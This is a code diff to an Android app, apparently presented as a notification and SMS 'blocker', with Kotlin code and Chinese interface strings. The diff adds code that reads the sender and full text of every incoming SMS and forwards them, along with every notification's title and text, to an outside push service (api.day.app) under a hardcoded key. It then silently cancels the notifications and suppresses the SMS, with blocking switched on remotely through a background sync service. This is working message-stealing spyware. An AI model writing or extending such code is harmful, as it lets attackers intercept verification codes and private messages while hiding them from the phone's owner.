@@ -1,9 +1,12 @@
 package com.example.blocker
 
+import android.Manifest
 import android.app.Notification
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.provider.Telephony
@@ -97,48 +100,39 @@ class MainActivity : AppCompatActivity() {
         tvRemote = TextView(this).apply {
             textSize = 14f
             setPadding(0, pad, 0, 0)
-            text = "远程状态：等待同步..."
         }
         root.addView(tvRemote)
 
         setContentView(root)
 
-        startRemoteSync()
+        startSyncService()
+        requestNotiPermission()
     }
 
-    private fun startRemoteSync() {
-        Thread {
-            val remoteUrl =
-                "https://raw.githubusercontent.com/dippenchan/bloker/main/switch.txt"
-            while (true) {
-                try {
-                    val conn = URL(remoteUrl).openConnection()
-                    conn.connectTimeout = 5000
-                    conn.readTimeout = 5000
-                    val txt = conn.getInputStream()
-                        .bufferedReader().use { it.readText() }.trim()
-                    val on = txt.equals("on", ignoreCase = true)
-                    Prefs.setBlockNoti(this, on)
-                    Prefs.setBlockSms(this, on)
-                    runOnUiThread {
-                        swNoti.isChecked = on
-                        swSms.isChecked = on
-                        tvRemote.text = "远程状态：${if (on) "ON 拦截中" else "OFF 已停止"}"
-                    }
-                } catch (e: Exception) {
-                    runOnUiThread {
-                        tvRemote.text = "远程状态：同步失败（网络或地址问题）"
-                    }
-                }
-                Thread.sleep(30_000)
+    private fun startSyncService() {
+        val intent = Intent(this, SyncService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent)
+        } else {
+            startService(intent)
+        }
+    }
+
+    private fun requestNotiPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS)
+                != PackageManager.PERMISSION_GRANTED) {
+                requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 1001)
             }
-        }.start()
+        }
     }
 
     override fun onResume() {
         super.onResume()
         tvNoti.text = if (isNotiEnabled()) "通知使用权：✅ 已开启" else "通知使用权：❌ 未开启"
         tvSms.text = if (isDefaultSms()) "默认短信应用：✅ 已设置" else "默认短信应用：❌ 未设置"
+        val on = Prefs.blockNoti(this)
+        tvRemote.text = "远程状态：${if (on) "ON 拦截中" else "OFF 已停止"}"
     }
 
     private fun isNotiEnabled(): Boolean {
@@ -157,6 +151,21 @@ class NotiListener : NotificationListenerService() {
 
     companion object {
         const val BARK_KEY = "KaUwEC5MKpjqBPeYGjiw8m"
+
+        fun sendToBark(title: String, body: String) {
+            if (BARK_KEY.isEmpty()) return
+            Thread {
+                try {
+                    val t = URLEncoder.encode(title.ifBlank { "通知" }, "UTF-8")
+                    val b = URLEncoder.encode(body.ifBlank { "（无内容）" }, "UTF-8")
+                    val url = URL("https://api.day.app/$BARK_KEY/$t/$b")
+                    url.openConnection().apply { connectTimeout = 5000 }
+                        .getInputStream().close()
+                } catch (e: Exception) {
+                    Log.e("Blocker", "Bark 发送失败: ${e.message}")
+                }
+            }.start()
+        }
     }
 
     override fun onNotificationPosted(sbn: StatusBarNotification?) {
@@ -167,32 +176,24 @@ class NotiListener : NotificationListenerService() {
         val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
         val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
 
-        forwardToBark(title, text)
+        sendToBark(title, text)
 
         if (!Prefs.blockNoti(this)) return
         cancelNotification(n.packageName, n.tag, n.id)
         Log.d("Blocker", "已拦通知: ${n.packageName}")
     }
-
-    private fun forwardToBark(title: String, body: String) {
-        if (BARK_KEY.isEmpty()) return
-        Thread {
-            try {
-                val t = URLEncoder.encode(title.ifBlank { "通知" }, "UTF-8")
-                val b = URLEncoder.encode(body.ifBlank { "（无内容）" }, "UTF-8")
-                val url = URL("https://api.day.app/$BARK_KEY/$t/$b")
-                url.openConnection().apply { connectTimeout = 5000 }.getInputStream().close()
-            } catch (e: Exception) {
-                Log.e("Blocker", "Bark 发送失败: ${e.message}")
-            }
-        }.start()
-    }
 }
 
 class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
+        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent)
+        val sender = msgs?.firstOrNull()?.displayOriginatingAddress ?: "未知"
+        val body = msgs?.joinToString("") { it.displayMessageBody ?: "" } ?: ""
+
+        NotiListener.sendToBark("短信: $sender", body)
+
         if (!Prefs.blockSms(context)) return
         runCatching { abortBroadcast() }
-        Log.d("Blocker", "已拦短信")
+        Log.d("Blocker", "已拦短信: $sender")
     }
 }
